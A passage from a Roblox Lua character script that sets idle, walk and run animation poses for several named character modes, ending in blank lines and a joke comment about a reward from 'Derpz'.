RW.C0 = RW.C0:lerp(cf(1.4,-0.1 + .05 * math.cos(sine/5),-0.9)*angles(math.rad(-168.5 + 3 * math.cos(sine/5)),math.rad(14.7),math.rad(-3.5)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(21 - 4 * math.cos(sine/5)),math.rad(0),math.rad(0)),Alpha)
end
elseif ModeOfCharacter == "Iniquitous" then
local Alpha = .12
RootJoint.C0 = RootJoint.C0:lerp(cf(0,1.3 + .7 * math.cos(sine/42),0)*angles(math.rad(-21),math.rad(-16.9),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.2,-1)*angles(math.rad(-40.8),math.rad(11.7),math.rad(-10.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.9,-0.7,-0.4)*angles(math.rad(30.1),math.rad(8.2),math.rad(0.4))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.3,0.5 + .1 * math.sin(sine/42),-0.5)*angles(math.rad(51.3 - 5 * math.cos(sine/60)),math.rad(-41.5 - 3 * math.cos(sine/43)),math.rad(19.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.2,0.3 + .1 * math.sin(sine/42),0.5)*angles(math.rad(-26.2 + 5 * math.cos(sine/50)),math.rad(-26.8 + 2 * math.cos(sine/41)),math.rad(-29.4)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(28.6 + 5 * math.cos(sine/40)),math.rad(10.3 + 2 * math.sin(sine/41)),math.rad(19.4)),Alpha)
elseif ModeOfCharacter == "Decorumed" then
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,1 + .5 * math.cos(sine/40),0)*angles(math.rad(0),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-1.4 + .1 * math.cos(sine/40),-0.3)*angles(math.rad(-10.9),math.rad(8.4),math.rad(79))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.1,-1.4 + .1 * math.cos(sine/40),-0.2)*angles(math.rad(5.1),math.rad(-20.5),math.rad(-78.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.8,0.5 + .1 * math.sin(sine/40),-0.7)*angles(math.rad(130 - 4 * math.sin(sine/49)),math.rad(-1),math.rad(86.9)),Alpha)
RW.C0 = RW.C0:lerp(cf(0.6,0.2 + .1 * math.sin(sine/40),-0.9)*angles(math.rad(137.5 - 3 * math.sin(sine/41)),math.rad(-0.5),math.rad(-90)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(39 - 3 * math.sin(sine/25)),math.rad(0),math.rad(3 * math.cos(sine/36))),Alpha)
elseif ModeOfCharacter == "meme" then

local Alpha = 0.3
RootJoint.C0 = RootJoint.C0:lerp(CFrame.new(0,-1+0.5*math.cos(sine/10),0+0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+10*math.cos(sine/10)),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(CFrame.new(-1,0+-0.5*math.cos(sine/10),-0.2+-0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+-15*math.cos(sine/10)),math.rad(0),math.rad(0))*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(CFrame.new(1,0+-0.5*math.cos(sine/10),-0.2+-0.1*math.cos(sine/10))*CFrame.Angles(math.rad(0+-15*math.cos(sine/10)),math.rad(0),math.rad(0))*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(CFrame.new(-1.5,0.5,0)*CFrame.Angles(math.rad(0+60*math.sin(sine/10)),math.rad(0),math.rad(0))*LeftShoulderC0,Alpha)
RW.C0 = RW.C0:lerp(CFrame.new(1.5,0.5,0)*CFrame.Angles(math.rad(0+60*math.sin(sine/10)),math.rad(0),math.rad(0))*RightShoulderC0,Alpha)
Neck.C0 = Neck.C0:lerp(necko*CFrame.new(0,0,0)*CFrame.Angles(math.rad(0+20*math.sin(sine/10)),math.rad(0),math.rad(0+9999*math.sin(sine/300))),Alpha)
elseif ModeOfCharacter == "Ambivalent" then
if YOUAREDEAD == false or YOUAREDEAD == "False?" then
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 - .1 * math.cos(sine/24),0)*angles(math.rad(3.2 - 1 * math.cos(sine/25)),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1 + .1 * math.cos(sine/24),0)*angles(math.rad(0.8 + 1 * math.cos(sine/25)),math.rad(8.1),math.rad(-5.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1 + .1 * math.cos(sine/24),0)*angles(math.rad(-7.6 + 1 * math.cos(sine/25)),math.rad(-13.9),math.rad(6.8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.4 - .1 * math.sin(sine/24),-0.2)*angles(math.rad(3.5),math.rad(-22.9 - 6 * math.cos(sine/35)),math.rad(9)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.1,0.1 - .05 * math.sin(sine/24),-0.4)*angles(math.rad(56),math.rad(-56.7),math.rad(-111.2)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(6.8 - 3 * math.cos(sine/20)),math.rad(-4.5),math.rad(3*math.cos(sine/50))),Alpha)
elseif YOUAREDEAD == true then
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 + .1 * math.cos(sine/15),0)*angles(math.rad(-20.1),math.rad(-15.5),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.2,-0.7 - .1 * math.cos(sine/15),-0.7)*angles(math.rad(25),math.rad(12.1),math.rad(-8.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1 - .1 * math.cos(sine/15),-0.2)*angles(math.rad(-4.1),math.rad(-9),math.rad(4.1))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.5,0.2 + .05 * math.sin(sine/15),-0.7)*angles(math.rad(0+ math.random(-6,6)),math.rad(25.9+ math.random(-6,6)),math.rad(128.6+ math.random(-6,6))),Alpha)
RW.C0 = RW.C0:lerp(cf(0.5,-0.1 + .05 * math.sin(sine/24),-0.9)*angles(math.rad(121.6+ math.random(-6,6)),math.rad(-7.9+ math.random(-6,6)),math.rad(-88.8+ math.random(-6,6))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(25.1 + math.random(-4,4)),math.rad(10+ math.random(-4,4)),math.rad(16.6+ math.random(-4,4))),Alpha)
end
elseif ModeOfCharacter == "Expeditious" then
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,2.1,0)*angles(math.rad(0),math.rad(-33.9),math.rad(2.9))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,0,-0.1)*angles(math.rad(-13.8),math.rad(36.1),math.rad(1.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.7,0)*angles(math.rad(23.6),math.rad(-25.1),math.rad(7.3))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.3,-0.1,-0.7)*angles(math.rad(129.1),math.rad(37.4),math.rad(25)),Alpha)
RW.C0 = RW.C0:lerp(cf(0.5,-0.2,-0.9)*angles(math.rad(89.4),math.rad(-4.9),math.rad(-96.5)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(-0),math.rad(-6),math.rad(31.7)),Alpha)
elseif ModeOfCharacter == "Inflamed" then
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,-0.1 + .1 * math.sin(sine/15),-0.1)*angles(math.rad(-10.2 - 3 * math.cos(sine/40)),math.rad(17.2 + 1 * math.cos(sine/35)),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1 - .1 * math.sin(sine/15),-0.5)*angles(math.rad(20.9 +3 * math.cos(sine/40)),math.rad(-11.6 - 1 * math.cos(sine/35)),math.rad(0.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.9 - .1 * math.sin(sine/15),-0.3)*angles(math.rad(-6.9 +3 * math.cos(sine/40)),math.rad(-26 - 1 * math.cos(sine/35)),math.rad(9.7))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.2 + .1 * math.sin(sine/41),0.2)*angles(math.rad(2.9 + 4 * math.sin(sine/40)+ math.random(-4,4)),math.rad(37+ math.random(-4,4)),math.rad(-7 - 5 * math.sin(sine/40)+ math.random(-4,4))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2 + .1 * math.sin(sine/41),0.2)*angles(math.rad(0 + 4 * math.sin(sine/40)+ math.random(-4,4)),math.rad(-24+ math.random(-4,4)),math.rad(9.8 + 5 * math.sin(sine/40)+ math.random(-4,4))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(11.2 - 5 * math.cos(sine/40) + math.random(-4,4)),math.rad(-2.3 + math.random(-4,4)),math.rad(-10.8 + 2 * math.cos(sine/45) + math.random(-4,4))),Alpha)

else
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 - .1 * math.cos(sine/52),0)*angles(math.rad(0 + 3 * math.cos(sine/51)),math.rad(13.3),math.rad(-3.8))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.1+.1 * math.cos(sine/52),0)*angles(math.rad(-8.3-4 * math.cos(sine/51)),math.rad(14.4),math.rad(1.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1+.1 * math.cos(sine/52),-0.1)*angles(math.rad(5-4 * math.cos(sine/51)),math.rad(-20.6),math.rad(7.6))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.4- .1 * math.cos(sine/50),0.1)*angles(math.rad(-7.6),math.rad(10.1 + 4 * math.cos(sine/50)),math.rad(-5.8- 2 * math.cos(sine/25))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.4 - .1 * math.cos(sine/50),0.3)*angles(math.rad(3.7),math.rad(-24.4- 4 * math.cos(sine/50)),math.rad(8.5+ 2 * math.cos(sine/25))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(5.7 - 5 * math.cos(sine/67)),math.rad(1.2 - 4 * math.cos(sine/63)),math.rad(-14.8)),.05)

end

elseif tired == true then
local Alpha = .05
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,-0.2)*angles(math.rad(-22.2),math.rad(0.3),math.rad(0.1))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.9,-0.1)*angles(math.rad(22.7),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.9,-0.2)*angles(math.rad(16.4),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.1,-0.3)*angles(math.rad(24.5),math.rad(0),math.rad(0)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.2,-0.1)*angles(math.rad(19.1),math.rad(0),math.rad(0)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.3,0.4)*angles(math.rad(-32.8),math.rad(0),math.rad(0))*necko,1)
end
end
elseif torvel > 2 and torvel < 22 and hitfloor ~= nil and hum:GetState() ~= Enum.HumanoidStateType.Swimming and hum:GetState() ~= Enum.HumanoidStateType.Climbing and hum.Sit ~= true then
Anim = "Walk"
if attack == false then
if youredead == true then
freefalldeathragdoll()
end
if ModeOfCharacter ~= "Inexplicable" and ModeOfCharacter ~= "Unrestrained" then
local Alpha = .15
local wsv = 3.5
local wsv2 = 7
 RootJoint.C0 = RootJoint.C0:lerp(cf(0,0+0.1*math.cos(sine/wsv),0)*angles(math.rad(0-10*Vec.Z+3*math.cos(sine/wsv)),math.rad(0 + 5 * math.cos(sine/wsv2)),math.rad(0-10*Vec.X))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1+0.2*math.sin(sine/wsv2)*Vec.X,-1+0.3*math.cos(sine/wsv2),-0.4*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(1+40*math.sin(sine/wsv2)*Vec.Z),math.rad(0-5 * math.cos(sine/wsv2)),math.rad(0+20*Vec.X*math.sin(sine/wsv2)))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1-0.2*math.sin(sine/wsv2)*Vec.X,-1-0.3*math.cos(sine/wsv2),0.4*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(-1-40*math.sin(sine/wsv2)*Vec.Z),math.rad(0-5 * math.cos(sine/wsv2)),math.rad(0-20*Vec.X*math.sin(sine/wsv2)))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.5,0+0.2*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(0-50*math.sin(sine/wsv2)*Vec.Z-10*math.cos(sine/wsv2)*Vec.X),math.rad(0 - 7 * math.cos(sine/wsv2)),math.rad(-4 + 6 * math.sin(sine/wsv2)*Vec.X)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.5,0-0.2*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(0+50*math.sin(sine/wsv2)*Vec.Z+10*math.cos(sine/wsv2)*Vec.X),math.rad(0 - 7 * math.cos(sine/wsv2)),math.rad(4 - 6 * math.sin(sine/wsv2)*Vec.X)),Alpha)
Neck.C0 = Neck.C0:lerp(necko*angles(math.rad(0-10*Vec.Z-4*math.sin(sine/wsv)),math.rad(0),math.rad(0-6 * math.cos(sine/wsv2))),.1)
else
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,1.2 + .3 * math.cos(sine/20),0)*angles(math.rad(-23*Vec.Z-4 * math.cos(sine/20)),math.rad(0),math.rad(-10*Vec.X))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(-27 - 4 * math.sin(sine/20)*Vec.Z),math.rad(11.3),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.4,-0.6)*angles(math.rad(-40.5 - 4 * math.sin(sine/20)*Vec.Z),math.rad(-6.8),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.4,0.3)*angles(math.rad(-33*Vec.Z-7 * math.cos(sine/41)),math.rad(19.5*Vec.Z),math.rad(0)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.3,0.4)*angles(math.rad(-30.4*Vec.Z-7 * math.cos(sine/41)),math.rad(-12.1*Vec.Z),math.rad(0)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(-15.8*Vec.Z - 3 * math.sin(sine/20)),math.rad(-3.4),math.rad(0)),Alpha)
end
end
elseif torvel >= 22 and torvel < 170 and hitfloor ~= nil and hum:GetState() ~= Enum.HumanoidStateType.Swimming and hum:GetState() ~= Enum.HumanoidStateType.Climbing and hum.Sit ~= true then
Anim = "Run"
if attack == false then
if youredead == true then
freefalldeathragdoll()
end
if ModeOfCharacter ~= "Inexplicable" and ModeOfCharacter ~= "Atmospherical" and ModeOfCharacter ~= "Resolute" and ModeOfCharacter ~= "Decorumed" and ModeOfCharacter ~= "Herculean" and ModeOfCharacter ~= "Iniquitous" then
local Alpha = .15
local wsv = 2.5
local wsv2 = 5
 RootJoint.C0 = RootJoint.C0:lerp(cf(0,0+0.15*math.cos(sine/wsv),0)*angles(math.rad(0-25*Vec.Z+3*math.cos(sine/wsv)),math.rad(0),math.rad(0-20*Vec.X))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1+0.4*math.sin(sine/wsv2)*Vec.X,-1+0.5*math.cos(sine/wsv2),-0.4*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(1+70*math.sin(sine/wsv2)*Vec.Z),math.rad(0),math.rad(0+20*Vec.X*math.sin(sine/wsv2)))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1-0.4*math.sin(sine/wsv2)*Vec.X,-1-0.5*math.cos(sine/wsv2),0.4*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(-1-70*math.sin(sine/wsv2)*Vec.Z),math.rad(0),math.rad(0-20*Vec.X*math.sin(sine/wsv2)))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.5,0+0.2*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(0-80*math.sin(sine/wsv2)*Vec.Z-10*math.cos(sine/wsv2)*Vec.X),math.rad(0),math.rad(0 + 6 * math.sin(sine/wsv2)*Vec.X)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.5,0-0.2*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(0+80*math.sin(sine/wsv2)*Vec.Z+10*math.cos(sine/wsv2)*Vec.X),math.rad(0),math.rad(0 - 6 * math.sin(sine/wsv2)*Vec.X)),Alpha)
Neck.C0 = Neck.C0:lerp(necko*angles(math.rad(0-10*Vec.Z-7*math.sin(sine/wsv)),math.rad(0),math.rad(0)),.1)
else
local Alpha = .15
local SpeedIncrease = hum.WalkSpeed/50
local wsv = 8-SpeedIncrease
local wsv2 = 16-SpeedIncrease

RootJoint.C0 = RootJoint.C0:lerp(cf(0+0.05*math.cos(sine/wsv2),0.7+0.1*math.cos(sine/wsv),-0.3+0.1*math.sin(sine/wsv2))*angles(math.rad(-60*Vec.Z),math.rad(3*math.cos(sine/wsv2)),math.rad(-20*Vec.X))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,-0.1)*angles(math.rad(-25+-5*math.cos(sine/40)),math.rad(10+5*math.cos(sine/60)),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.1,-1)*angles(math.rad(-30+5*math.sin(sine/wsv2)),math.rad(-5),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4+-0.1*math.sin(sine/wsv2),0.1,0.3)*angles(math.rad(-40*Vec.Z),math.rad(-3*math.cos(sine/wsv2)),math.rad(-10+-5*math.sin(sine/wsv2)))*LeftShoulderC0,Alpha)
RW.C0 = RW.C0:lerp(cf(1.4+0.1*math.sin(sine/wsv2),0.1,0.3)*angles(math.rad(-40*Vec.Z),math.rad(-3*math.cos(sine/wsv2)),math.rad(10+5*math.sin(sine/wsv2)))*RightShoulderC0,Alpha)
Neck.C0 = Neck.C0:lerp(necko*cf(0,-0.1,0)*angles(math.rad(-40*Vec.Z+-4*math.cos(sine/wsv)),math.rad(0*math.cos(sine/wsv2)),math.rad(0)),Alpha)
end
end

elseif torvel > 170 and hitfloor ~= nil and hum:GetState() ~= Enum.HumanoidStateType.Swimming and hum:GetState() ~= Enum.HumanoidStateType.Climbing and hum.Sit ~= true then
Anim = "FasterRun"
if attack == false then

local Alpha = .15
local wsv = 1.5
local wsv2 = 3
 RootJoint.C0 = RootJoint.C0:lerp(cf(0,0+0.15*math.cos(sine/wsv),0)*angles(math.rad(0-35*Vec.Z+3*math.cos(sine/wsv)),math.rad(0),math.rad(0-20*Vec.X))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1+0.5*math.sin(sine/wsv2)*Vec.X,-1+0.6*math.cos(sine/wsv2),-0.4*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(1+80*math.sin(sine/wsv2)*Vec.Z),math.rad(0),math.rad(0+20*Vec.X*math.sin(sine/wsv2)))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1-0.5*math.sin(sine/wsv2)*Vec.X,-1-0.6*math.cos(sine/wsv2),0.4*math.sin(sine/wsv2)*Vec.Z)*angles(math.rad(-1-80*math.sin(sine/wsv2)*Vec.Z),math.rad(0),math.rad(0-20*Vec.X*math.sin(sine/wsv2)))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.5,0+0.2*math.sin(sine/wsv)*Vec.Z)*angles(math.rad(-50*Vec.Z-10*math.cos(sine/wsv2)*Vec.X),math.rad(0),math.rad(0 + 6 * math.sin(sine/wsv2)*Vec.X)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.5,0+0.2*math.sin(sine/wsv)*Vec.Z)*angles(math.rad(-50*Vec.Z+10*math.cos(sine/wsv2)*Vec.X),math.rad(0),math.rad(0 - 6 * math.sin(sine/wsv2)*Vec.X)),Alpha)
Neck.C0 = Neck.C0:lerp(necko*angles(math.rad(0-10*Vec.Z-5*math.sin(sine/wsv)),math.rad(0),math.rad(0)),.1)

end
end
end
end

--"while true do" Animations, repeated colors, effects
























































































--CONGRATULATIONS! You reached the end of this script. Your reward? Well, Wait and see! Send this to Derpz for your reward.